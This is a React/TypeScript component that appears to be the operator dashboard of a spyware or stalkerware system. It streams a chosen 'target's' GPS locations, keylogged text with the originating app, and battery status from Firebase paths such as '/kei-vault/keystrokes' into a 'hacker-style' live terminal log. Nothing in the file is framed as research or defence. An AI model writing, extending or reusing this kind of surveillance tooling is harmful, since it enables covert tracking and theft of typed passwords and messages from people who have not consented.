'use client';

import { useEffect, useRef, useState } from 'react';
import { MapPin, Keyboard, BatteryCharging } from 'lucide-react';
import { clsx } from 'clsx';
import { twMerge } from 'tailwind-merge';
import { onValue, ref } from 'firebase/database';
import { database, FIREBASE_PATHS } from '@/lib/firebase';

const cn = (...inputs: Array<string | false | null | undefined>) => twMerge(clsx(inputs));

interface ActivityLogProps {
  targetId?: string;
}

interface LogEntry {
  id: string;
  timestamp: number;
  message: string;
}

const formatTime = (timestamp: number) =>
  new Date(timestamp).toLocaleTimeString('id-ID', {
    hour: '2-digit',
    minute: '2-digit',
  });

export default function ActivityLog({ targetId }: ActivityLogProps) {
  const [entries, setEntries] = useState<LogEntry[]>([]);
  const [loading, setLoading] = useState(true);
  const containerRef = useRef<HTMLDivElement>(null);
  const locationsRef = useRef<Record<string, any>>({});
  const keystrokesRef = useRef<Record<string, any>>({});
  const activeRef = useRef<Record<string, any>>({});

  useEffect(() => {
    if (!targetId) {
      setEntries([]);
      setLoading(false);
      return;
    }

    setLoading(true);

    const locationRef = ref(database, FIREBASE_PATHS.DEVICE_LOCATIONS);
    const keystrokeRef = ref(database, '/kei-vault/keystrokes');
    const activeTargetRef = ref(database, FIREBASE_PATHS.ACTIVE_TARGETS);

    const buildEntries = () => {
      const targetLocations = locationsRef.current[targetId];
      const targetKeystrokes = keystrokesRef.current[targetId];
      const targetActive = activeRef.current[targetId];

      const collected: LogEntry[] = [];

      if (targetLocations) {
        if (Array.isArray(targetLocations)) {
          targetLocations.forEach((loc: any, index: number) => {
            const timestamp = loc.timestamp ?? Date.now();
            const coords = `${loc.lat ?? loc.latitude ?? loc.latlng?.lat ?? '-'}, ${loc.lng ?? loc.longitude ?? loc.latlng?.lng ?? '-'}`;
            collected.push({
              id: `loc-${targetId}-${index}-${timestamp}`,
              timestamp,
              message: `📍 Location: ${coords}`,
            });
          });
        } else {
          Object.entries(targetLocations).forEach(([key, loc]: any) => {
            const timestamp = loc?.timestamp ?? Date.now();
            const coords = `${loc?.lat ?? loc?.latitude ?? loc?.latlng?.lat ?? '-'}, ${loc?.lng ?? loc?.longitude ?? loc?.latlng?.lng ?? '-'}`;
            collected.push({
              id: `loc-${targetId}-${key}-${timestamp}`,
              timestamp,
              message: `📍 Location: ${coords}`,
            });
          });
        }
      }

      if (targetKeystrokes) {
        Object.entries(targetKeystrokes).forEach(([key, record]: any) => {
          const timestamp = record?.timestamp ?? record?.ts ?? Date.now();
          const appLabel = record?.app ?? record?.application ? ` [${record?.app ?? record?.application}]` : '';
          const text = record?.text ?? record?.keys ?? record?.value ?? '—';
          collected.push({
            id: `key-${targetId}-${key}-${timestamp}`,
            timestamp,
            message: `⌨️ Keylog${appLabel}: "${text}"`,
          });
        });
      }

      if (targetActive) {
        const battery = typeof targetActive.battery === 'number' ? `${targetActive.battery}%` : 'N/A';
        const charging = targetActive.charging ? ' (Charging)' : '';
        const timestamp = targetActive.last_seen ?? targetActive.lastSeen ?? Date.now();
        const status = targetActive.status ?? 'UNKNOWN';
        collected.push({
          id: `bat-${targetId}-${timestamp}`,
          timestamp,
          message: `🔋 Battery: ${battery}${charging} • ${status.toUpperCase()}`,
        });
      }

      const sorted = collected.sort((a, b) => a.timestamp - b.timestamp).slice(-70);
      setEntries(sorted);
      setLoading(false);
    };

    const unsubscribeLocations = onValue(locationRef, (snapshot) => {
      locationsRef.current = snapshot.val() ?? {};
      buildEntries();
    });

    const unsubscribeKeystrokes = onValue(keystrokeRef, (snapshot) => {
      keystrokesRef.current = snapshot.val() ?? {};
      buildEntries();
    });

    const unsubscribeActive = onValue(activeTargetRef, (snapshot) => {
      activeRef.current = snapshot.val() ?? {};
      buildEntries();
    });

    return () => {
      unsubscribeLocations();
      unsubscribeKeystrokes();
      unsubscribeActive();
    };
  }, [targetId]);

  useEffect(() => {
    if (!containerRef.current) return;
    containerRef.current.scrollTop = containerRef.current.scrollHeight;
  }, [entries]);

  return (
    <section className="rounded-[32px] border border-white/10 bg-slate-950/85 p-6 shadow-2xl shadow-slate-950/30 backdrop-blur-xl">
      <div className="flex flex-col gap-4 sm:flex-row sm:items-center sm:justify-between">
        <div>
          <p className="text-sm uppercase tracking-[0.3em] text-rose-300/70">Terminal Mode</p>
          <h3 className="mt-2 text-2xl font-semibold text-white">Activity Log</h3>
          <p className="max-w-sm text-sm text-slate-400">
            Hacker-style event stream dari lokasi, keylog, dan status baterai. Auto-scroll saat data baru muncul.
          </p>
        </div>
        <div className="flex items-center gap-2 text-sm text-slate-400">
          <MapPin size={16} />
          <Keyboard size={16} />
          <BatteryCharging size={16} />
        </div>
      </div>

      <div className="mt-6 overflow-hidden rounded-[28px] border border-white/10 bg-black/95">
        <div ref={containerRef} className="min-h-[420px] max-h-[720px] overflow-y-auto px-5 py-5 font-mono text-sm leading-6 text-emerald-300">
          {loading ? (
            <div className="text-slate-500">Menghubungkan ke feed...</div>
          ) : !targetId ? (
            <div className="text-slate-500">Pilih target untuk melihat log aktivitas real-time.</div>
          ) : entries.length === 0 ? (
            <div className="text-slate-500">Menunggu data aktivitas baru...</div>
          ) : (
            entries.map((entry) => (
              <div key={entry.id} className="mb-3 flex items-start gap-3">
                <span className="text-slate-500">[{formatTime(entry.timestamp)}]</span>
                <span>{entry.message}</span>
              </div>
            ))
          )}
        </div>
      </div>
    </section>
  );
}
